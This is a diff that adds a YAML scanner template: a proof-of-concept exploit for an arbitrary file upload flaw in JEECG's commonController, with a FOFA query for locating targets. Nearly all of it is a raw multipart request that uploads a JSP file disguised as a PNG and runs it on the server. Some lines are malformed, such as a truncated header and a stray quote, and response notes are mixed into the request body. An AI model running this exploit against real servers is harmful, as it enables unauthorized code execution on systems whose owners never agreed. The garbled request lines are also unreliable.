@@ -1,0 +1,84 @@
+id: poc-hohk8lsxu0ypfndg
+info:
+  name: Jeecg commonController 任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hohk8lsxu0ypfndg'
+  tags: file-upload,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: hohk8lsxu0ypfndg
+    fofa: app="JEECG"
+http:
+- raw:
+  - 'POST /api/../commonController.do?parserXml HTTP/1.1
+
+
+    Accept-Encoding: gzip, deflate
+
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundarygcflwtei
+
+
+    Connection: close
+
+
+
+
+    ------WebKitFormBoundarygcflwtei
+
+
+    Content-Disposition: form-data; "name="name"
+
+
+
+
+    zW9YCa.png
+
+
+    ------WebKitFormBoundarygcflwtei
+
+
+    ontent-Disposition: form-data; name="documentTitle"
+
+
+
+
+    blank
+
+
+    ------WebKitFormBoundarygcflwtei
+
+
+    Content-Disposition: form-data; name="file"; filename="dudesite.jsp"
+
+
+    Content-Type: image/png
+
+
+
+
+    <% out.println("dudesite");new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
+
+
+    ------WebKitFormBoundarygcflwtei--
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    success
+
+
+    # 上传文件定位
+
+    /dudesite.jsp'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
